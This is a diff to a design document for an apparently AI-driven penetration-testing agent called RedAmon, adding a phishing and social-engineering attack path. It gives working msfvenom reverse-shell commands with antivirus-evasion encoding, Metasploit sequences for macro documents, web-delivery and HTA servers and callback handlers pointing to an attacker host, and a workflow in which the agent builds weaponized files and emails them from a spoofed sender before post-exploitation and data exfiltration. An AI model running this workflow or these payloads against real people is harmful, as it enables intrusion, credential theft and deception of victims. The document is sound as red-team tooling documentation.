@@ -2,7 +2,7 @@
 
 Comprehensive documentation of all Metasploit attack path categories and the proposed Agent Routing system for intelligent attack chain orchestration.
 
-> **Context**: The RedAmon agent supports CVE-based exploitation, Hydra brute force credential guess chains, and **unclassified attack paths** (dynamic fallback for techniques that don't match the two primary categories), with no-module fallback workflows using nuclei, curl, code execution, and Kali shell tools. This document defines all possible attack path categories to enable evolution toward a multi-path routing system.
+> **Context**: The RedAmon agent supports CVE-based exploitation, Hydra brute force credential guess chains, **phishing / social engineering** (payload generation, malicious documents, web delivery, email delivery), and **unclassified attack paths** (dynamic fallback for techniques that don't match the three primary categories), with no-module fallback workflows using nuclei, curl, code execution, and Kali shell tools. This document defines all possible attack path categories to enable evolution toward a multi-path routing system.
 
 ---
 
@@ -32,11 +32,12 @@ Comprehensive documentation of all Metasploit attack path categories and the pro
 
 ### Implemented Attack Chains
 
-The orchestrator (`orchestrator.py`) implements three classified attack path categories:
+The orchestrator (`orchestrator.py`) implements four classified attack path categories:
 
 1. **CVE-Based Exploitation** (`cve_exploit`) — Metasploit-based CVE exploitation with payload selection
 2. **Brute Force / Credential Guess** (`brute_force_credential_guess`) — THC Hydra brute force against 50+ protocols
-3. **Unclassified Fallback** (`<term>-unclassified`) — Dynamic classification for techniques that don't match the above (e.g., `sql_injection-unclassified`, `ssrf-unclassified`). Uses generic tool guidance without workflow-specific prompts.
+3. **Phishing / Social Engineering** (`phishing_social_engineering`) — Payload generation (msfvenom), malicious document creation (Office macros, PDF, RTF, LNK), web delivery, HTA delivery, and email sending via smtplib
+4. **Unclassified Fallback** (`<term>-unclassified`) — Dynamic classification for techniques that don't match the above (e.g., `sql_injection-unclassified`, `ssrf-unclassified`). Uses generic tool guidance without workflow-specific prompts.
 
 Additionally, the CVE path includes a **No-Module Fallback** workflow for CVEs without Metasploit modules.
 
@@ -80,10 +81,10 @@ Additionally, the CVE path includes a **No-Module Fallback** workflow for CVEs w
 
 ### Remaining Limitations
 
-1. **Two Attack Paths**: Only CVE exploit and Hydra brute force credential guess are fully implemented
-2. **No Social Engineering**: Phishing, client-side attacks not yet supported as classified paths
-3. **No DoS/Fuzzing Chains**: DoS and fuzzing workflows not yet implemented as classified paths
-4. **No Credential Capture**: MITM/capture chains not yet implemented
+1. **Three Attack Paths**: CVE exploit, Hydra brute force, and phishing/social engineering are fully implemented
+2. **No DoS/Fuzzing Chains**: DoS and fuzzing workflows not yet implemented as classified paths
+3. **No Credential Capture**: MITM/capture chains not yet implemented
+4. **No Client-Side Exploitation**: Browser-based exploitation not yet a classified path
 
 ---
 
@@ -152,7 +153,7 @@ auxiliary/
 |---|----------|-------------|-------------|------------|------------|
 | 1 | CVE-Based Exploitation | `search CVE-*` | exploit | Yes | High |
 | 2 | Brute Force / Credential | `use auxiliary/scanner/*/login` | auxiliary | Sometimes | Medium |
-| 3 | Social Engineering | `use auxiliary/server/*` | auxiliary/exploit | Yes | High |
+| 3 | Social Engineering **(IMPLEMENTED)** | `msfvenom`, `fileformat/*`, `web_delivery` | auxiliary/exploit | Yes | High |
 | 4 | DoS / Availability | `use auxiliary/dos/*` | auxiliary | No | Low |
 | 5 | Fuzzing / Discovery | `use auxiliary/fuzzers/*` | auxiliary | No | Low |
 | 6 | Credential Capture | `use auxiliary/server/capture/*` | auxiliary | Sometimes | Medium |
@@ -575,83 +576,241 @@ When a user request doesn't match CVE exploitation or brute force credential gue
 
 ---
 
-## Category 3: Social Engineering / Phishing
+## Category 3: Social Engineering / Phishing (CURRENT — `phishing_social_engineering`)
 
-**Description**: Attacks targeting human factors rather than technical vulnerabilities.
+**Status**: IMPLEMENTED
+**Classification**: `phishing_social_engineering`
+**Prompts**: `prompts/phishing_social_engineering_prompts.py`
 
-**Entry Detection Keywords**: `phish`, `social`, `email`, `campaign`, `usb`, `malicious`, `fake`, `clone`, `spear`
+**Description**: Attacks targeting human factors rather than technical vulnerabilities. Instead of exploiting a software bug directly, the agent generates malicious payloads, documents, or delivery mechanisms that require a human to execute — opening a file, clicking a link, or running a command. This is a **human-in-the-loop** attack path: the attacker crafts the bait, but the victim's action triggers the payload callback.
 
-### 3.1 Phishing Email Campaign
+**Entry Detection Keywords**: `phish`, `phishing`, `social engineering`, `spear phishing`, `payload generation`, `malicious document`, `macro`, `msfvenom`, `trojan`, `dropper`, `email attack`, `fake email`, `web delivery`, `hta`, `office macro`, `backdoor`, `implant`, `campaign`, `lure`, `bait`, `send email`, `craft email`, `generate payload`, `malicious file`, `reverse shell payload`, `create backdoor`
 
-**Workflow**:
+**Key Difference from CVE Exploit**: CVE exploitation targets a software vulnerability directly — the agent fires the exploit and the vulnerable service is compromised automatically. Phishing/social engineering targets a _person_ — the agent generates a weaponized artifact and delivers it, but a human must execute it for the attack to succeed.
+
+### How It Works: The 6-Step Workflow
+
+The agent follows a mandatory 6-step workflow when classified as `phishing_social_engineering`:
+
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│              PHISHING CAMPAIGN CHAIN                             │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│  1. Generate payload:                                            │
-│     msfvenom -p windows/meterpreter/reverse_tcp                 │
-│              LHOST=<attacker> LPORT=<port> -f exe > payload.exe │
-│                                                                  │
-│  2. Set up handler:                                              │
-│     use exploit/multi/handler                                    │
-│     set PAYLOAD windows/meterpreter/reverse_tcp                 │
-│     set LHOST <attacker>                                         │
-│     set LPORT <port>                                             │
-│     exploit -j                                                   │
-│                                                                  │
-│  3. Deliver payload via phishing (SET or manual)                │
-│                                                                  │
-│  4. Wait for victim to execute                                   │
-│                                                                  │
-└─────────────────────────────────────────────────────────────────┘
-```
-
-### 3.2 Web Delivery Attack
-
-**Workflow**:
-```
-┌─────────────────────────────────────────────────────────────────┐
-│              WEB DELIVERY CHAIN                                  │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│  1. use exploit/multi/script/web_delivery                       │
-│  2. set TARGET <0=Python, 1=PHP, 2=PSH, 3=Regsvr32, etc.>      │
-│  3. set PAYLOAD <windows/meterpreter/reverse_tcp>               │
-│  4. set LHOST <attacker>                                         │
-│  5. set LPORT <port>                                             │
-│  6. set SRVPORT <web_server_port>                               │
-│  7. exploit -j                                                   │
-│                                                                  │
-│  Output: One-liner command to trick victim into running         │
-│                                                                  │
-└─────────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────────────────┐
+│              PHISHING / SOCIAL ENGINEERING WORKFLOW                       │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  Step 1: DETERMINE TARGET PLATFORM & DELIVERY METHOD                    │
+│    ├── Target OS: Windows / Linux / macOS / Android / Multi-platform    │
+│    └── Method: A) Standalone Payload  B) Malicious Document             │
+│                C) Web Delivery        D) HTA Delivery                   │
+│                                                                          │
+│  Step 2: SET UP HANDLER (always — runs in background)                   │
+│    └── exploit/multi/handler + matching payload + LHOST/LPORT + run -j  │
+│                                                                          │
+│  Step 3: GENERATE PAYLOAD / DOCUMENT (choose one method)                │
+│    ├── A: msfvenom → exe/elf/apk/ps1/vba/hta-psh/war/macho/raw        │
+│    ├── B: Metasploit fileformat → Word/Excel/PDF/RTF/LNK               │
+│    ├── C: web_delivery → Python/PHP/PSH/Regsvr32/pubprn one-liner      │
+│    └── D: hta_server → URL the target opens in browser                  │
+│                                                                          │
+│  Step 4: VERIFY PAYLOAD WAS GENERATED                                   │
+│    └── ls -la, file command, jobs check                                  │
+│                                                                          │
+│  Step 5: DELIVER TO TARGET                                               │
+│    ├── Chat download: report path + docker cp command                   │
+│    ├── Email: execute_code with Python smtplib (SMTP config from        │
+│    │          project settings or asked at runtime)                      │
+│    └── Web link: report one-liner (Method C) or URL (Method D)          │
+│                                                                          │
+│  Step 6: WAIT FOR CALLBACK & VERIFY SESSION                             │
+│    └── sessions -l → if session opens → post_exploitation               │
+│                                                                          │
+└─────────────────────────────────────────────────────────────────────────┘
 ```
 
-### 3.3 Social Engineering Modules
+### 3.1 Method A: Standalone Payload (msfvenom)
+
+Generate a binary, script, or APK that the target executes directly. Uses `msfvenom` via the `kali_shell` tool.
+
+**Payload + Format Matrix:**
+
+| Target OS | Payload | Format (`-f`) | Output | Notes |
+|-----------|---------|---------------|--------|-------|
+| Windows | `windows/meterpreter/reverse_tcp` | `exe` | `payload.exe` | Most common |
+| Windows | `windows/meterpreter/reverse_https` | `exe` | `payload.exe` | Encrypted, firewall bypass |
+| Windows | `windows/shell_reverse_tcp` | `exe` | `shell.exe` | Fallback if meterpreter fails |
+| Windows | `windows/meterpreter/reverse_tcp` | `psh` | `payload.ps1` | PowerShell script (fileless) |
+| Windows | `windows/meterpreter/reverse_tcp` | `psh-reflection` | `payload.ps1` | Reflective PS (AV evasion) |
+| Windows | `windows/meterpreter/reverse_tcp` | `vba` | `payload.vba` | VBA macro code for Office |
+| Windows | `windows/meterpreter/reverse_tcp` | `hta-psh` | `payload.hta` | HTA with embedded PowerShell |
+| Linux | `linux/x64/meterpreter/reverse_tcp` | `elf` | `payload.elf` | Standard ELF binary |
+| Linux | `cmd/unix/reverse_bash` | `raw` | `payload.sh` | Bash one-liner |
+| Linux | `cmd/unix/reverse_python` | `raw` | `payload.py` | Python one-liner |
+| macOS | `osx/x64/meterpreter/reverse_tcp` | `macho` | `payload.macho` | Mach-O binary |
+| Android | `android/meterpreter/reverse_tcp` | `raw` | `payload.apk` | Android APK |
+| Java/Web | `java/meterpreter/reverse_tcp` | `war` | `payload.war` | WAR for Tomcat/JBoss |
+| Multi | `python/meterpreter/reverse_tcp` | `raw` | `payload.py` | Cross-platform Python |
+
+**Example command:**
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o /tmp/payload.exe
+```
+
+**AV evasion (optional encoding):**
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o /tmp/payload_encoded.exe
+```
+
+### 3.2 Method B: Malicious Document (Metasploit Fileformat Modules)
+
+Generate weaponized Office, PDF, RTF, or LNK files via Metasploit fileformat modules. These exploit vulnerabilities or macros in document readers to execute a payload when the target opens the file.
+
+| # | File Type | Description | Metasploit Module |
+|---|-----------|-------------|-------------------|
+| 1 | **Word Macro (.docm)** | VBA macro payload embedded in Word document | `exploit/multi/fileformat/office_word_macro` |
+| 2 | **Excel Macro (.xlsm)** | VBA macro payload embedded in Excel spreadsheet | `exploit/multi/fileformat/office_excel_macro` |
+| 3 | **PDF (Adobe Reader)** | PDF with embedded executable payload | `exploit/windows/fileformat/adobe_pdf_embedded_exe` |
+| 4 | **RTF (CVE-2017-0199)** | RTF that fetches an HTA payload when opened | `exploit/windows/fileformat/office_word_hta` |
+| 5 | **LNK Shortcut** | Malicious Windows shortcut file | `exploit/windows/fileformat/lnk_shortcut_ftype_append` |
+
+**Critical: Output location** — All fileformat modules save output to `/root/.msf4/local/<FILENAME>`. The agent always copies the file to `/tmp/` for easier access.
+
+**Example (Word macro):**
+```
+use exploit/multi/fileformat/office_word_macro
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.0.0.1
+set LPORT 4444
+set FILENAME malicious.docm
+run
+```
+
+### 3.3 Method C: Web Delivery (Fileless)
+
+Host a payload on the attacker's web server and generate a one-liner command that the target pastes into a terminal. The payload runs in memory — no file touches disk, making this more stealthy than file-based methods.
+
+| TARGET # | Language | One-liner runs on | Best for |
+|----------|----------|-------------------|----------|
+| 0 | Python | Linux/macOS/Win with Python | Cross-platform targets |
+| 1 | PHP | Web servers with PHP | Compromised web servers |
+| 2 | PSH (PowerShell) | Windows | Standard Windows targets |
+| 3 | Regsvr32 | Windows | AppLocker bypass |
+| 4 | pubprn | Windows | Script execution bypass |
+| 5 | SyncAppvPublishingServer | Windows | App-V bypass |
+| 6 | PSH Binary | Windows | Binary via PowerShell |
+
+**Example:**
+```
+use exploit/multi/script/web_delivery
+set TARGET 2
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.0.0.1
+set LPORT 4444
+set SRVHOST 0.0.0.0
+set SRVPORT 8080
+run -j
+```
+The module prints a one-liner command — that IS the delivery payload. The web server runs as a background job until the target executes it.
+
+### 3.4 Method D: HTA Delivery Server
+
+Host an HTA (HTML Application) that executes a payload when opened in a browser. The target must visit the URL or be tricked into opening the `.hta` file.
+
+```
+use exploit/windows/misc/hta_server
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.0.0.1
+set LPORT 4444
+set SRVHOST 0.0.0.0
+set SRVPORT 8080
+run -j
+```
+The module prints a URL like `http://10.0.0.1:8080/random.hta`. Delivery scenarios: embed in a phishing email, redirect from a compromised page, or social-engineer the target into visiting.
+
+### 3.5 The Handler (Required for All Methods)
+
+Every phishing attack needs a **handler** running in the background to catch the callback when the target executes the payload. The handler MUST use the exact same payload type, LHOST, and LPORT as the generated artifact — mismatched values cause the callback to silently fail.
+
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp   # Must match the payload in Step 3
+set LHOST 10.0.0.1                              # Must match LHOST used in generation
+set LPORT 4444                                   # Must match LPORT used in generation
+run -j                                           # Background job — waits for connection
+```
+
+The handler reads LHOST/LPORT from the project's "Pre-Configured Payload Settings" (configured in the Agent Behaviour tab). If ngrok TCP tunnel is enabled, the public endpoint is used automatically.
+
+### 3.6 Delivery Methods
+
+After generating the payload, the agent delivers it through one of three channels:
+
+#### Chat Download (Default)
+
+The agent reports the file path and provides a `docker cp` command for the user to download the file:
+```bash
+docker cp redamon-kali:/tmp/payload.exe ./payload.exe
+```
+The user manually sends the file to the target through any channel (email, chat, USB, shared drive).
+
+#### Email Delivery (On Request)
+
+The agent uses `execute_code` with Python `smtplib` to send the payload as an email attachment or embed a link. The agent writes and runs a Python script inside the Kali container that connects to an external SMTP server (Gmail, Outlook, etc.) and sends the email.
+
+**SMTP Configuration**: Stored in the project settings as a free-text field (`PHISHING_SMTP_CONFIG`). The agent reads this when the phishing path is active. Example:
+```
+SMTP_HOST: smtp.gmail.com
+SMTP_PORT: 587
+SMTP_USER: pentest@gmail.com
+SMTP_PASS: abcd efgh ijkl mnop
+SMTP_FROM: it-support@company.com
+USE_TLS: true
+```
+
+If no SMTP settings are configured, the agent asks the user for SMTP host, port, username, password, sender address, and target email via `action="ask_user"`. It never attempts to send without credentials.
+
+> **Why SMTP?** Email cannot be sent "directly" from the Kali container — modern mail servers reject emails from IP addresses without proper SPF/DKIM/DMARC records. The agent relays through a legitimate SMTP service (Gmail App Passwords, Outlook, SendGrid, etc.) to ensure delivery.
+
+#### Web Delivery Link (Methods C & D)
+
+For web delivery and HTA attacks, the "payload" is a URL or one-liner command. The agent reports it in the chat — no file transfer needed.
+
+### 3.7 Social Engineering Module Reference
 
 | # | Attack Type | Description | Metasploit Module |
 |---|-------------|-------------|-------------------|
 | 1 | **Multi Handler** | Generic payload handler for callbacks | `exploit/multi/handler` |
-| 2 | **Web Delivery (Python)** | Python-based payload delivery | `exploit/multi/script/web_delivery` |
+| 2 | **Web Delivery (Python)** | Python-based payload delivery | `exploit/multi/script/web_delivery` (TARGET 0) |
 | 3 | **Web Delivery (PowerShell)** | PowerShell-based payload delivery | `exploit/multi/script/web_delivery` (TARGET 2) |
-| 4 | **Web Delivery (Regsvr32)** | COM scriptlet delivery | `exploit/multi/script/web_delivery` (TARGET 3) |
+| 4 | **Web Delivery (Regsvr32)** | COM scriptlet delivery (AppLocker bypass) | `exploit/multi/script/web_delivery` (TARGET 3) |
 | 5 | **HTA Delivery** | HTML Application delivery | `exploit/windows/misc/hta_server` |
 | 6 | **Office Macro Payload** | Malicious Office document | `exploit/multi/fileformat/office_*` |
-| 7 | **PDF Exploit** | Malicious PDF file | `exploit/multi/fileformat/adobe_*` |
+| 7 | **PDF Exploit** | Malicious PDF file | `exploit/windows/fileformat/adobe_pdf_*` |
 | 8 | **USB Rubber Ducky** | BadUSB HID attacks | Payload generation with msfvenom |
 | 9 | **Fake Update Page** | Browser fake update | `auxiliary/server/browser_autopwn2` |
 | 10 | **DNS Hijack Phishing** | Redirects to fake pages | Combine with `auxiliary/spoof/dns/*` |
 
-### 3.4 Malicious Document Generation
+### 3.8 Post-Exploitation
 
-| # | File Type | Description | Metasploit Module |
-|---|-----------|-------------|-------------------|
-| 11 | **Word Macro** | VBA macro payload | `exploit/multi/fileformat/office_word_macro` |
-| 12 | **Excel Macro** | Excel VBA macro | `exploit/multi/fileformat/office_excel_macro` |
-| 13 | **PDF (Adobe Reader)** | PDF embedded payload | `exploit/windows/fileformat/adobe_pdf_*` |
-| 14 | **RTF (CVE-2017-0199)** | RTF HTA handler | `exploit/windows/fileformat/office_word_hta` |
-| 15 | **LNK File** | Malicious shortcut | `exploit/windows/fileformat/lnk_*` |
+When the target executes the payload and the handler catches the callback, a Meterpreter session opens. The agent then requests transition to `post_exploitation` phase — identical to CVE exploit post-exploitation (interactive session commands, enumeration, lateral movement, data exfiltration).
+
+If no session opens after delivery, the agent:
+1. Verifies handler is running (`jobs` in metasploit_console)
+2. Checks payload/handler match (same type, LHOST, LPORT)
+3. Tries a different payload format if the platform was wrong
+4. Asks the user if the target has executed the payload
+5. **Stops after 3 failed attempts** and asks the user for guidance
+
+### Implementation Files
+
+| File | Purpose |
+|------|---------|
+| `agentic/prompts/phishing_social_engineering_prompts.py` | Full 6-step workflow prompts, payload format guidance, troubleshooting table |
+| `agentic/prompts/classification.py` | LLM classification keywords and 10 example requests for phishing routing |
+| `agentic/prompts/__init__.py` | Routing branch in `get_phase_tools()` — injects phishing prompts + SMTP config |
+| `agentic/state.py` | `phishing_social_engineering` in `KNOWN_ATTACK_PATHS` set |
+| `agentic/project_settings.py` | `PHISHING_SMTP_CONFIG` default setting + API field mapping |
+| `webapp/prisma/schema.prisma` | `phishingSmtpConfig` database field |
+| `webapp/src/components/projects/ProjectForm/sections/PhishingSection.tsx` | SMTP configuration textarea in project settings UI |
+| `webapp/src/app/graph/components/AIAssistantDrawer/AIAssistantDrawer.tsx` | Pink "PHISH" badge in AI agent drawer |
 
 ---
 
